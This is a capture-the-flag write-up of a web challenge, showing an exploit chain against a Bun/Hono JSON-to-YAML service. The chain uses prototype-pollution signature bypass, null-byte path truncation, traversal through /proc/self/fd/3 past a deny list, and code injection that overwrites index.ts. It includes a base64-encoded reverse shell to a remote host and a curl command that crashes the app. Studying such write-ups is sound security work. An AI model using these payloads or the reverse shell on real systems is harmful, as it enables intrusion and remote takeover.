prisoner processor
============

The goal of the challenge is to get RCE (based on the suid `getflag` program). There are multiple parts that needed to be completed to solve this challenge.

# Part 1: Bypass the Signature Verification

First we need to get an example JSON with a valid signature from the `/examples` endpoint. For an example, I will be using the following example in this writeup and building upon it.

```json
{
    "data": {
        "signed.name": "jeff",
        "signed.animalType": "emu",
        "signed.age": 12,
        "signed.crime": "assault",
        "signed.description": "clotheslined someone with their neck",
        "signed.start": "2024-03-02T10:45:01Z",
        "signed.release": "2054-03-02T10:45:01Z"
    },
    "signature": "5c9396d88b7765d1c69dd949adfcc1f82ed766cbf534c16297eed346a4b453f5"
}
```

Let's look at how the signed data in the json request was verified.

```ts
const SIGNED_PREFIX = "signed.";

...

const getSignature = (data: any): string => {
  const toSignArray = Object.entries(data).map(([k, v]) => `${k}=${v}`);
  toSignArray.sort();
  return createHmac('sha256', SECRET_KEY)
    .update(toSignArray.join("&"))
    .digest("hex");
};

const hasValidSignature = (data: any, signature: string): boolean => {
  const signedInput = getSignature(data);
  return signedInput === signature
};

const getSignedData = (data: any): any => {
  const signedParams: any = {};
  for (const param in data) {
    if (param.startsWith(SIGNED_PREFIX)) {
      const keyName = param.slice(SIGNED_PREFIX.length);
      signedParams[keyName] = data[param];
    }
  }
  return signedParams;
};

...

app.post('/convert-to-yaml',
  bodyLimit({
    maxSize: 50 * 1024, // 50kb limit
  }),
  zValidator('json', requestSchema),
  (c) => {
    try {
      const body = c.req.valid('json');
      const data = body.data;
      const signedData = getSignedData(data)
      const signature = body.signature;
      if (!hasValidSignature(signedData, signature)) {
        return c.json({ msg: "signatures do no match!" }, 400);
      }
      const outputPrefix = z.string().parse(signedData.outputPrefix ?? "prisoner");
      const outputFile = `${outputPrefix}-${randomBytes(8).toString("hex")}.yaml`;
      if (convertJsonToYaml(data, outputFile)) {
        return c.json({ msg: outputFile });
      } else {
        return c.json({ msg: "failed to convert JSON" }, 500);
      }
    } catch (error) {
      console.error(error);
      return c.json({ msg: "why you send me a bad request???" }, 400);
    }
  }
);
```

The issue here is that `getSignedData` iterates through the properties and any propeties that start with `signed.` gets placed in the `signedParams`. If there was a property named `signed.__proto__` then it would could `signedParams["__proto__"] = data["signed.__proto__"]` and poison the prototype for the `signedParams` variable.

This would then bypass our injected values being hashed in `getSignature` since `Object.entries(data)` does not iterate over the properties of an inputs `__proto__` object.

Therefore, our first iteration of the payload is as follows.

```json
{
    "data": {
        "signed.name": "jeff",
        "signed.animalType": "emu",
        "signed.age": 12,
        "signed.crime": "assault",
        "signed.description": "clotheslined someone with their neck",
        "signed.start": "2024-03-02T10:45:01Z",
        "signed.release": "2054-03-02T10:45:01Z",
        "signed.__proto__": {
            "outputPrefix": "someotherprefix"
        }
    },
    "signature": "5c9396d88b7765d1c69dd949adfcc1f82ed766cbf534c16297eed346a4b453f5"
}
```

# Part 2: Null byte path truncation bug in `bun`

Referring to the source code, now that we can modify the `signedData.outPrefix` we can exploit a path traversal vulnerability since `../` is valid within the path. However, the following line of code appends a random hex string and the `.yaml` file extension to the end of our prefix, meaning we can't overwrite anything interesting.

```ts
const outputFile = `${outputPrefix}-${randomBytes(8).toString("hex")}.yaml`;
```

This `outputFile` is then used to create a `BunFile` object in `convertJsonToYaml` as shown below.

```ts
const convertJsonToYaml = (data: any, outputFileString: string): boolean => {

  const outputFile = Bun.file(`${OUTPUT_YAML_FOLDER}/${outputFileString}`);
  // Prevent accidental overwriting of app files
  if (existsSync(outputFile) || checkIfContainsBannedString(outputFileString)) {
    return false
  }

  try {
    const yamlData = stringify(data);
    Bun.write(outputFile, yamlData);
    return true;
  } catch (error) {
    console.error(error)
    return false;
  }
};
```

So a funny bug about files in `bun`, if you can inject **null bytes** into the file path then **`bun` would truncate the everything after the null byte**, because `bun` is built on type of `zig` programming language where strings a terminated by null bytes (same as C).

So now our following payload would remove the pesky hex and `.yaml` file extension after our prefix.

```json
{
    "data": {
        "signed.name": "jeff",
        "signed.animalType": "emu",
        "signed.age": 12,
        "signed.crime": "assault",
        "signed.description": "clotheslined someone with their neck",
        "signed.start": "2024-03-02T10:45:01Z",
        "signed.release": "2054-03-02T10:45:01Z",
        "signed.__proto__": {
            "outputPrefix": "someotherprefix\u0000"
        }
    },
    "signature": "5c9396d88b7765d1c69dd949adfcc1f82ed766cbf534c16297eed346a4b453f5"
}
```

# Part 3: Bypassing the Basic WAF to Overwrite `/app/src/index.ts` By Using the `/proc/self/fd/3` Symlink

Now that we nearly have arbitrary file write on the app container, our goal would be to overwrite one of the executed scripts in `/app` in the container (such as `/app/src/index.ts`) with parsed YAML.

However, there is a basic deny list WAF that prevent directly writing into the `/app` (or `/home`) folder.

```ts
...

const BANNED_STRINGS = [
  "app", "src", ".ts", "node", "package", "bun", "home", "etc", "usr", "opt", "tmp", "index", ".sh"
];

...

const checkIfContainsBannedString = (outputFile: string): boolean => {
  for (const banned of BANNED_STRINGS) {
    if (outputFile.includes(banned)) {
      return true
    }
  }
  return false;
}
```

Checking the running `bun` process in the `/proc` container, we can see that there is an open file descriptor that is symlinked to `/app/src/index.ts`.

```
bun@00e2ab35194f:/proc/8/fd$ ls -al
total 0
dr-x------ 2 bun bun  0 May 17 14:56 .
dr-xr-xr-x 9 bun bun  0 May 17 14:56 ..
lrwx------ 1 bun bun 64 May 17 14:56 0 -> /dev/null
l-wx------ 1 bun bun 64 May 17 14:56 1 -> 'pipe:[7964267]'
lrwx------ 1 bun bun 64 May 17 14:56 10 -> 'anon_inode:[timerfd]'
lrwx------ 1 bun bun 64 May 17 14:56 11 -> 'anon_inode:[timerfd]'
lrwx------ 1 bun bun 64 May 17 14:56 12 -> 'anon_inode:[timerfd]'
lrwx------ 1 bun bun 64 May 17 14:56 13 -> 'socket:[7973081]'
l-wx------ 1 bun bun 64 May 17 14:56 2 -> 'pipe:[7964268]'
lr-x------ 1 bun bun 64 May 17 14:56 3 -> /app/src/index.ts
lr-x------ 1 bun bun 64 May 17 14:56 4 -> /dev/urandom
lr-x------ 1 bun bun 64 May 17 14:56 5 -> /dev/urandom
lr-x------ 1 bun bun 64 May 17 14:56 6 -> /proc/8/statm
lrwx------ 1 bun bun 64 May 17 14:56 7 -> 'anon_inode:[eventpoll]'
lrwx------ 1 bun bun 64 May 17 14:56 8 -> 'anon_inode:[timerfd]'
lrwx------ 1 bun bun 64 May 17 14:56 9 -> 'anon_inode:[eventfd]'
```

So to bypass the WAF we just then traverse to `/proc/self/fd/3`.

```json
{
    "data": {
        "signed.name": "jeff",
        "signed.animalType": "emu",
        "signed.age": 12,
        "signed.crime": "assault",
        "signed.description": "clotheslined someone with their neck",
        "signed.start": "2024-03-02T10:45:01Z",
        "signed.release": "2054-03-02T10:45:01Z",
        "signed.__proto__": {
            "outputPrefix": "../../proc/self/fd/3\u0000"
        }
    },
    "signature": "5c9396d88b7765d1c69dd949adfcc1f82ed766cbf534c16297eed346a4b453f5"
}
```

# Part 4: Manipulating the Parsed YAML to Valid TypeScript

Now that we can overwrite `/app/src/index.ts`, we would need to manipulate the saved YAML into valid TypeScript syntax so that it could be executed and not throw a syntax error. The JSON below would result in the YAML file being valid TypeScript since types are defined after the `:` and the `/**/` comment out the rest of the stuff.

*input json*
```json
{
    "data": {
        "const a": "string = Bun.spawnSync({cmd:[\"bash\",\"-c\", \"echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQyNDIgMD4mMQ==${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash${IFS}-i\"]});/*",
        "signed.name": "jeff",
        "signed.animalType": "emu",
        "signed.age": 12,
        "signed.crime": "assault",
        "signed.description": "clotheslined someone with their neck",
        "signed.start": "2024-03-02T10:45:01Z",
        "signed.release": "2054-03-02T10:45:01Z",
        "signed.__proto__": {
            "outputPrefix": "../../proc/self/fd/3\u0000"
        },
        "z": "hi */"
    },
    "signature": "5c9396d88b7765d1c69dd949adfcc1f82ed766cbf534c16297eed346a4b453f5"
}
```
*output YAML saved to `/app/src/index.ts` with TypeScript syntax highlighting*
```ts
const a: string = Bun.spawnSync({cmd:["bash","-c",
  "echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQyNDIgMD4mMQ==${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash${IFS}-i"]});/*
signed.name: jeff
signed.animalType: emu
signed.age: 12
signed.crime: assault
signed.description: clotheslined someone with their neck
signed.start: 2024-03-02T10:45:01Z
signed.release: 2054-03-02T10:45:01Z
signed.__proto__:
  outputPrefix: "../../proc/self/fd/3\0"
z: hi */
```

`Bun.spawnSync` spawns a new process with our base64 encoded reverse shell payload

# Part 5: Crash the App to Execute Our Payload

Now that we have overwritten the `/app/src/index.ts` with valid TypeScript, we just need crash the app so it would restart and execute our payload.

Despite the `/convert-to-yaml` and `/examples` endpoints being wrapped in try catch statements, there are probably a lot of different bugs in `bun` and `hono` you could exploit to cause an unhandled exception and make the app crash.

Here are two bugs I found that work.

## Crash `hono/bodyLimit` By Phat File

`hono/bodyLimit` crashes if it is trying process a large malformed JSON request. An exception is raised by the [`hono` `validator` if the file is malformed JSON](https://github.com/honojs/hono/blob/d87d9964433a4777b09abff9360ff12643d00440/src/validator/validator.ts#L76-L79). However, if you upload a *phat* file (like stream `/dev/urandom` phat), the app would crash with the following error message.

```
1 | (function (controller, error) {"use strict";
                        ^
TypeError: undefined is not an object
      at readableStreamDefaultControllerError (:1:21)
```

The following `curl` command would crash the app for you.

```bash
curl -F 'file=@/dev/urandom' -H 'Content-Type: application/json' -X POST http://localhost:3000/convert-to-yaml
```

## Crash `bun` By Failing `open` syscall

I sort of accidentally stumbled across this one, when `bun` calls the `syscall` `open` where the path is a symlink to an invalid file where there some escaped character it would crash. For an example, `../../proc/self/fd/3\x`. The `solve.py` uses this method to crash the app

# Part 6: Get Flag

`getflag`